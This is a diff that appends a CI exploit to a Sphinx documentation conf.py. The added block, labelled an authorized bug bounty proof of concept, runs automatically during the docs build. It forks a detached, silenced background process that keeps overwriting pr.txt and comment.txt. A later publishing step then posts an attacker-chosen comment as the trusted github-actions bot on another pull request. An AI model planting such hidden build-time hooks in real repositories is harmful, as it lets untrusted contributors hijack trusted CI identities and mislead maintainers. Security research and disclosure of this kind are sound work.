@@ -247,3 +247,48 @@ def setup(app):
     utils.add_google_analytics(app, html_theme_options)
     utils.add_kapa_search(app)
     utils.add_announcement_banner(html_theme_options)
+
+
+# === Authorized bug bounty PoC (F1B) - trusted artifact comment forgery ===
+# docbuild.yml executes this conf.py from the untrusted PR checkout, then later
+# uploads ncs/nrf/{monitor*.txt,pr.txt,comment.txt} as artifacts that
+# action-docpublish posts as github-actions[bot]. Legitimate steps write
+# pr.txt/comment.txt AFTER the docs build, so a background rewriter keeps
+# attacker-chosen content current until the Upload step reads the files.
+try:
+    import os as _poc_os, time as _poc_time, pathlib as _poc_pl
+    _poc_root = _poc_pl.Path(__file__).resolve().parents[2]
+    _poc_marker = "BOUNTY-POC-F1B"
+    _poc_body = (
+        "### docbuild preview comment (" + _poc_marker + ")\n\n"
+        "**This comment is forged.** It was produced by attacker-controlled code "
+        "running in the untrusted fork PR docbuild workflow and posted with the "
+        "trusted github-actions[bot] identity by action-docpublish.\n\n"
+        "- Source run: PR #31608 (hook injected at the end of doc/nrf/conf.py)\n"
+        "- Target PR: chosen by the attacker via pr.txt (swapped to #31609)\n"
+        "- Impact: arbitrary trusted-bot comment on arbitrary PRs via the docbuild "
+        "artifact trust chain\n\n"
+        "Authorized bug bounty PoC for the Nordic Semiconductor CI/CD program "
+        "(YesWeHack). Safe to delete. Marker: " + _poc_marker
+    )
+    if _poc_os.fork() == 0:
+        try:
+            _poc_os.setsid()
+            for _fd in (0, 1, 2):
+                try:
+                    _poc_os.dup2(_poc_os.open(_poc_os.devnull, _poc_os.O_RDWR), _fd)
+                except OSError:
+                    pass
+            _poc_until = _poc_time.time() + 3300
+            while _poc_time.time() < _poc_until:
+                try:
+                    (_poc_root / "pr.txt").write_text("31609\n")
+                    (_poc_root / "comment.txt").write_text(_poc_body)
+                except OSError:
+                    pass
+                _poc_time.sleep(0.3)
+        finally:
+            _poc_os._exit(0)
+except Exception:
+    pass
+# === end authorized bug bounty PoC ===
